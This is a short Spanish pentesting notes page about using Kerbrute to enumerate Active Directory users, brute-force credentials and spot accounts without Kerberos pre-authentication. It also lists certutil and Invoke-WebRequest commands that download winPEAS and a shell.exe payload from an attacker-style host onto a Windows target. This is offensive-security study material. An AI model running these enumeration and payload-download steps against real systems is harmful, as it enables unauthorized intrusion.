# Kerbrute

* Lo usamos para enumerar usuarios dentro de un directorio activo, indicando el dominio, la IP y un diccionario de usuarios válidos para comprobar si los tenemos dentro del sistema. También nos indicaría si alguno de ellos tiene la función non-preauth.

!\[\[Pasted image 20240730032138.png]]

{% stepper %}
{% step %}
### Objetivo

Enumerar usuarios en Active Directory para identificar cuentas válidas y detectar si alguna cuenta tiene la configuración non-preauth.
{% endstep %}

{% step %}
### Ataque de fuerza bruta

Buscamos hacer un ataque de fuerza bruta con la herramienta para obtener credenciales válidas.
{% endstep %}

{% step %}
### Conexión sin contraseña (NOT-PREAUTH)

{% hint style="info" %}
Si tenemos un usuario con la configuración NOT-PREAUTH, nos podemos conectar sin usar contraseña.
{% endhint %}
{% endstep %}

{% step %}
### Descarga/ejecución de ficheros en Windows

Ejemplos de comandos usados para descargar y ejecutar ficheros en una máquina Windows:

{% code title="Descargar con certutil" %}
```powershell
certutil -urlcache -split -f http://10.250.1.2/winPEAS.bat C:\Windows\Temp\winpeas.bat
```
{% endcode %}

{% code title="Descargar con Invoke-WebRequest" %}
```powershell
Invoke-WebRequest http://10.250.1.2/shell.exe -OutFile C:\Windows\Temp\shell.exe
```
{% endcode %}
{% endstep %}
{% endstepper %}
